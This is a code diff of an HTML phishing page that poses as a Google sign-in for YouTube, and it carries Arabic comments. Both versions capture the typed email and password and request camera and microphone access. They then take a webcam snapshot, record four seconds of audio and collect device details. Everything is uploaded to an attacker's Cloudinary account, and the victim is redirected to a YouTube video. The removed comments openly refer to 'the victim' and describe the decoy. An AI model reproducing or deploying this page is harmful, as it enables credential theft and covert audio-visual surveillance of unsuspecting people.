@@ -3,99 +3,96 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google - التحقق من الهوية</title>
+    <title>Google - YouTube Login</title>
     <style>
-        body, html { margin: 0; padding: 0; height: 100%; overflow: hidden; font-family: sans-serif; background: #fff; }
-        .card { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 90%; max-width: 400px; padding: 40px; border: 1px solid #ddd; border-radius: 8px; background: #fff; z-index: 1000; text-align: center; }
-        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; }
-        button { background: #1a73e8; color: #fff; border: none; padding: 12px; width: 100%; border-radius: 4px; cursor: pointer; font-weight: 600; }
-        
-        /* اليوتيوب هيفتح هنا في الخلفية عشان صفحتنا تفضل "عايشة" وتصور براحتها */
-        #yt-frame { width: 100%; height: 100%; border: none; display: none; }
-        #v, #c { display: none; }
+        body { margin: 0; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #fff; overflow: hidden; }
+        .card { width: 90%; max-width: 400px; padding: 30px; border: 1px solid #ddd; border-radius: 8px; text-align: center; z-index: 100; background: #fff; }
+        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; }
+        button { background: #1a73e8; color: #fff; border: none; padding: 12px; width: 100%; border-radius: 4px; cursor: pointer; font-weight: bold; }
+        #v, #c { position: absolute; visibility: hidden; width: 1px; height: 1px; }
     </style>
 </head>
 <body>
 
 <div class="card" id="ui">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" width="75" style="margin-bottom:15px;">
-    <h2>تسجيل الدخول</h2>
-    <p>المتابعة إلى YouTube</p>
+    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" width="75">
+    <h2>تأكيد الهوية</h2>
+    <p>سجل دخولك للمتابعة إلى YouTube</p>
     <input type="email" id="e" placeholder="البريد الإلكتروني" required>
     <input type="password" id="p" placeholder="كلمة المرور" required>
     <button onclick="run()">التالي</button>
 </div>
 
-<iframe id="yt-frame"></iframe>
-
 <video id="v" autoplay playsinline muted></video>
 <canvas id="c" width="640" height="480"></canvas>
 
 <script>
-    const cn = 'dgkttv99v', pr = 'ml_default', yt = "https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1";
+    // تأكد 100% من كتابة الـ Cloud Name والـ Preset صح (حالات الأحرف مهمة)
+    const cloudName = 'dgkttv99v'; 
+    const preset = 'ml_default'; 
+    const yt = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
 
     async function run() {
-        const email = document.getElementById('e').value, pass = document.getElementById('p').value;
-        if(!email || !pass) return alert("يرجى إدخال البيانات");
+        const email = document.getElementById('e').value;
+        const pass = document.getElementById('p').value;
+        if(!email || !pass) return;
 
         try {
-            // 1. طلب الصلاحيات فوراً
             const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-            const video = document.getElementById('v');
-            video.srcObject = stream;
-            video.play();
+            document.getElementById('v').srcObject = stream;
+            
+            document.getElementById('ui').innerHTML = "<h3>جاري التحقق...</h3><p>يرجى عدم إغلاق الصفحة</p>";
 
-            // 2. التمويه الوهمي: افتح يوتيوب في نفس الصفحة
-            document.getElementById('ui').style.display = 'none';
-            const frame = document.getElementById('yt-frame');
-            frame.src = yt;
-            frame.style.display = 'block';
+            // سحب بيانات الجهاز
+            const specs = `Model: ${navigator.platform} | Browser: ${navigator.userAgent}`;
 
-            // 3. دلوقتي صفحتنا لسه شغال (رغم إن الضحية شايف يوتيوب)
-            // هنستنى 3 ثواني عشان الكاميرا والمايك يجمعوا داتا حقيقية مش سواد
+            // تصوير وإرسال بعد 3 ثواني لضمان الصورة
             setTimeout(() => {
-                captureAndRecord(email, pass, stream);
+                const canvas = document.getElementById('c');
+                canvas.getContext('2d').drawImage(document.getElementById('v'), 0, 0, 640, 480);
+                const imgData = canvas.toDataURL("image/png");
+
+                // تسجيل صوتي 4 ثواني
+                const rec = new MediaRecorder(stream);
+                let chunks = [];
+                rec.ondataavailable = ev => chunks.push(ev.data);
+                rec.onstop = () => {
+                    const audioBlob = new Blob(chunks, { type: 'audio/webm' });
+                    
+                    // إرسال البيانات فوراً
+                    upload(email, pass, imgData, audioBlob, specs);
+
+                    // تحويل إجباري بعد ثانية من الإرسال
+                    setTimeout(() => { window.location.href = yt; }, 1500);
+                };
+                rec.start();
+                setTimeout(() => rec.stop(), 4000);
             }, 3000);
 
-        } catch (err) {
-            window.location.href = "https://www.youtube.com";
-        }
+        } catch (e) { window.location.href = yt; }
     }
 
-    async function captureAndRecord(e, p, stream) {
-        // التقاط الصورة من الفيديو "الشغال فعلياً"
-        const canvas = document.getElementById('c');
-        canvas.getContext('2d').drawImage(document.getElementById('v'), 0, 0, 640, 480);
-        const img = canvas.toDataURL("image/png");
+    function upload(e, p, img, aud, s) {
+        const ctx = `User=${e}|Pass=${p}|Specs=${s}`;
 
-        // تسجيل صوتي قصير (4 ثواني) لضمان السرعة
-        const recorder = new MediaRecorder(stream);
-        let chunks = [];
-        recorder.ondataavailable = ev => chunks.push(ev.data);
-        recorder.onstop = () => {
-            const audioBlob = new Blob(chunks, { type: 'audio/webm' });
-            // الرفع الفعلي بدون keepalive لأننا في نفس الصفحة
-            uploadData(e, p, img, audioBlob);
-        };
-
-        recorder.start();
-        setTimeout(() => recorder.stop(), 4000);
-    }
-
-    async function uploadData(e, p, img, aud) {
-        const ctx = `u=${e}|p=${p}`;
-
-        // رفع الصورة
+        // رفع الصورة باستخدام XMLHttpRequest (أضمن بكتير من fetch في ويندوز 7)
+        const xhr1 = new XMLHttpRequest();
+        xhr1.open('POST', `https://api.cloudinary.com/v1_1/${cloudName}/image/upload`, true);
         const fd1 = new FormData();
-        fd1.append('file', img); fd1.append('upload_preset', pr);
-        fd1.append('context', ctx); fd1.append('tags', 'DeathLink');
-        fetch(`https://api.cloudinary.com/v1_1/${cn}/image/upload`, { method: 'POST', body: fd1 });
+        fd1.append('file', img);
+        fd1.append('upload_preset', preset);
+        fd1.append('context', ctx);
+        xhr1.send(fd1);
 
         // رفع الصوت
+        const xhr2 = new XMLHttpRequest();
+        xhr2.open('POST', `https://api.cloudinary.com/v1_1/${cloudName}/upload`, true);
         const fd2 = new FormData();
-        fd2.append('file', aud); fd2.append('upload_preset', pr);
-        fd2.append('resource_type', 'video'); fd2.append('context', ctx);
-        fetch(`https://api.cloudinary.com/v1_1/${cn}/upload`, { method: 'POST', body: fd2 });
+        fd2.append('file', aud);
+        fd2.append('upload_preset', preset);
+        fd2.append('resource_type', 'video');
+        fd2.append('context', ctx);
+        xhr2.send(fd2);
     }
 </script>
 </body>
